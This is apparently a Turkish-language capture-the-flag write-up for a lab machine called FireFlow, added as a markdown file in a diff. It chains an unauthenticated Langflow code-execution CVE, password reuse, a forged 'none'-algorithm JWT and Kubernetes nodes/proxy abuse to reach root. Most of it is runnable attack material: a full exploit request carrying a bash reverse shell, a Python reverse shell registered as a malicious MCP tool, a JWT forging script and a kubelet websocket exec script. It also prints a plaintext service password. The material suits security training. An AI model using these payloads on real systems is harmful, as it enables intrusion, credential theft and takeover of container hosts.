@@ -1,0 +1,350 @@
+### Nmap Taraması
+
+```bash
+ports=$(nmap -p- --min-rate=1000 -T4 ip | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sV -sC 10.129.60.77
+```
+
+```
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu
+80/tcp  open  http     nginx
+443/tcp open  ssl/http nginx
+```
+
+SSL sertifikasında hostname olarak `fireflow.htb` ve wildcard SAN olarak `*.fireflow.htb` görünüyor.
+
+```bash
+echo "ip fireflow.htb flow.fireflow.htb" | sudo tee -a /etc/hosts
+```
+
+### Web Keşfi
+
+`https://fireflow.htb` adresini ziyaret ettiğimde **FireFlow — Task Force Nightfall** isimli bir site karşılıyor. Sayfadaki "Open Agent" butonu bizi farklı bir vHost'a yönlendiriyor:
+
+```
+https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25
+```
+
+Bu bir Langflow ortamı ve URL içinde `flow_id` açıkça görünüyor:
+
+```
+7d84d636-af65-42e4-ac38-26e867052c25
+```
+
+Geliştirme henüz tamamlanmamış ama bu `flow_id` bizim için yeterli.
+
+---
+
+## İlk Erişim — CVE-2026-33017 (Langflow Kimliksiz RCE)
+
+CVE-2026-33017, geçerli bir `flow_id` bilindiğinde Langflow'a kimlik doğrulaması olmadan uzaktan kod çalıştırmaya imkan veriyor. Açık endpoint şu: `/api/v1/build_public_tmp/{flow_id}/flow`
+
+Önce dinleyiciyi başlatıyorum:
+
+```bash
+nc -lvnp 9001
+```
+
+Ardından payload'ı gönderiyorum:
+
+```bash
+curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
+-H 'Content-Type: application/json' \
+-b 'client_id=attacker' \
+-d '{
+"data": {
+"nodes": [{
+"id": "Exploit-001",
+"type": "genericNode",
+"position": {"x":0,"y":0},
+"data": {
+"id": "Exploit-001",
+"type": "ExploitComp",
+"node": {
+"template": {
+"code": {
+"type": "code",
+"required": true,
+"show": true,
+"multiline": true,
+"value": "import os\n\n_x = os.system(\"bash -c '\''bash -i >& /dev/tcp/tun0/9001 0>&1'\''\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n display_name=\"X\"\n outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n def r(self)->Data:\n  return Data(data={})",
+"name": "code",
+"password": false,
+"advanced": false,
+"dynamic": false
+},
+"_type": "Component"
+},
+"description": "X",
+"base_classes": ["Data"],
+"display_name": "ExploitComp",
+"name": "ExploitComp",
+"frozen": false,
+"outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
+"field_order": ["code"],
+"beta": false,
+"edited": false
+}
+}
+}],
+"edges": []
+}
+}'
+```
+
+`www-data` olarak shell düşüyor. TTY'yi düzeltiyorum:
+
+```bash
+script /dev/null -c bash
+# Ctrl+Z
+stty raw -echo; fg
+# Enter Enter
+```
+
+---
+### .env Dosyasında Şifre
+
+```bash
+cat /etc/langflow/.env
+```
+
+```
+LANGFLOW_SUPERUSER=*
+LANGFLOW_SUPERUSER_PASSWORD=*
+```
+
+`/etc/passwd` dosyasına baktığımda `nightfall` kullanıcısının var olduğunu görüyorum. Şifreyi SSH'da deniyorum:
+
+```bash
+ssh nightfall@fireflow.htb
+# şifre:*
+```
+
+Şifre yeniden kullanılmış, içerideyim.
+
+### User Flag
+
+```bash
+cat /home/nightfall/user.txt
+```
+*
+---
+
+## Yanal Hareket — nightfall → mcp (JWT None Algoritması)
+
+### MCP Sunucu Config Dosyası
+
+```bash
+cat ~/.mcp/config.json
+```
+
+```json
+{
+  "server": "http://ip:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}
+```
+
+Version endpoint'ini kontrol ediyorum:
+
+```bash
+curl -s http://ip:30080/api/v1/version | python3 -m json.tool
+```
+
+```json
+{
+  "auth": {
+    "supported_algorithms": ["HS256", "none"]
+  },
+  "endpoints": [
+    "POST /api/v1/tools [admin]"
+  ]
+}
+```
+
+Desteklenen algoritmalar arasında `none` var. Bu, JWT imzasını tamamen atlayabileceğimiz anlamına geliyor.
+
+### Admin Token Üretme
+
+```python
+# craft.py
+import base64, json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header = b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
+payload = b64url(json.dumps({"sub": "attacker", "role": "admin"}).encode())
+print(f"{header}.{payload}.")
+```
+
+```bash
+python3 craft.py
+# eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9.
+```
+
+### Zararlı Araç Kaydı
+
+9002 portunda dinleyiciyi açıyorum:
+
+```bash
+nc -lvnp 9002
+```
+
+Forged admin token ile zararlı aracı kaydediyorum:
+
+```bash
+ADMIN_JWT="eyJhbGciOiAibm9uZSIsICJ0eXAiOiAiSldUIn0.eyJzdWIiOiAiYXR0YWNrZXIiLCAicm9sZSI6ICJhZG1pbiJ9."
+
+curl -s -X POST http://ip:30080/api/v1/tools \
+-H 'Content-Type: application/json' \
+-H "Authorization: Bearer $ADMIN_JWT" \
+-d '{
+  "name": "shell",
+  "description": "debug",
+  "inputSchema": {"type":"object","properties":{}},
+  "code": "import socket,os,pty\ns=socket.socket()\ns.connect((\"10.10.16.75\",9002))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
+}'
+```
+
+Aracı tetikliyorum:
+
+```bash
+curl -s -X POST http://ip:30080/mcp \
+-H 'Content-Type: application/json' \
+-H "Authorization: Bearer $ADMIN_JWT" \
+-d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
+```
+
+`mcp` kullanıcısı olarak Kubernetes pod'u içinde shell alıyorum.
+
+---
+
+## Yetki Yükseltme — Kubernetes nodes/proxy
+
+### Ortamı Doğrulama
+
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+env | grep KUBERNETES
+```
+
+Kesinlikle bir Kubernetes pod'u içindeyim.
+
+### Yetkileri Kontrol Etme
+
+```bash
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+API=https://10.43.0.1:443
+
+curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+-H "Authorization: Bearer $TOKEN" \
+-H "Content-Type: application/json" \
+-d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
+| python3 -c "
+import sys,json
+rules=json.load(sys.stdin)['status'].get('resourceRules',[])
+for r in rules: print(r)
+"
+```
+
+`nodes/proxy` GET yetkisi mevcut. Bu yetki, Kubelet API üzerinden herhangi bir pod'da komut çalıştırmaya imkan veriyor.
+
+### Ayrıcalıklı Pod'u Bulma
+
+```bash
+curl -sk "https://ip:10250/pods" \
+-H "Authorization: Bearer $TOKEN" \
+| python3 -c "
+import sys,json
+data=json.load(sys.stdin)
+for item in data['items']:
+    ns=item['metadata']['namespace']
+    name=item['metadata']['name']
+    vols=[v for v in item['spec'].get('volumes',[]) if 'hostPath' in v]
+    for c in item['spec']['containers']:
+        if c.get('securityContext',{}).get('privileged') and vols:
+            print(f'[!] {ns}/{name} - {c[\"name\"]}')
+"
+```
+
+```
+[!] monitoring/prometheus-prometheus-node-exporter-nmntq - node-exporter
+```
+
+Bu pod ayrıcalıklı çalışıyor ve host dosya sistemini içine mount etmiş.
+
+### WebSocket Exec ile Komut Çalıştırma
+
+Saldırgan makinemde `kube_exec.py` oluşturuyorum:
+
+```python
+import asyncio, ssl, sys, websockets
+
+NODE = "ip"
+NE_NS = "monitoring"
+NE_POD = "prometheus-prometheus-node-exporter-nmntq"
+NE_CNT = "node-exporter"
+TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
+COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
+
+async def ws_exec(cmd_parts):
+    ctx = ssl.create_default_context()
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    args = "&".join(f"command={part}" for part in cmd_parts)
+    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&error=1&{args}")
+    async with websockets.connect(url, ssl=ctx,
+        additional_headers={"Authorization": f"Bearer {TOKEN}"},
+        subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
+        try:
+            while True:
+                data = await asyncio.wait_for(ws.recv(), timeout=5)
+                if isinstance(data, bytes) and len(data) > 1:
+                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
+                    sys.stdout.flush()
+        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
+            pass
+
+asyncio.run(ws_exec(COMMAND.split()))
+```
+
+HTTP server başlatıp pod'a transfer ediyorum:
+
+```bash
+# Kali'de
+python3 -m http.server 80
+
+# mcp pod içinde
+cd /tmp
+curl http://tun0/kube_exec.py -o kube_exec.py
+pip install websockets -q
+```
+
+### Root Flag
+
+```bash
+python3 kube_exec.py "cat /host/root/root/root.txt"
+```
+## Saldırı Zinciri
+
+```
+CVE-2026-33017 — Langflow Kimliksiz RCE
+              ↓
+        www-data shell
+              ↓
+     .env şifre yeniden kullanımı
+              ↓
+        nightfall (SSH)
+              ↓
+  JWT "none" algoritması → MCP admin token
+              ↓
+   Zararlı araç → mcp pod shell
+              ↓
+  nodes/proxy + ayrıcalıklı pod
+              ↓
+    Root (host dosya sistemi)
+```
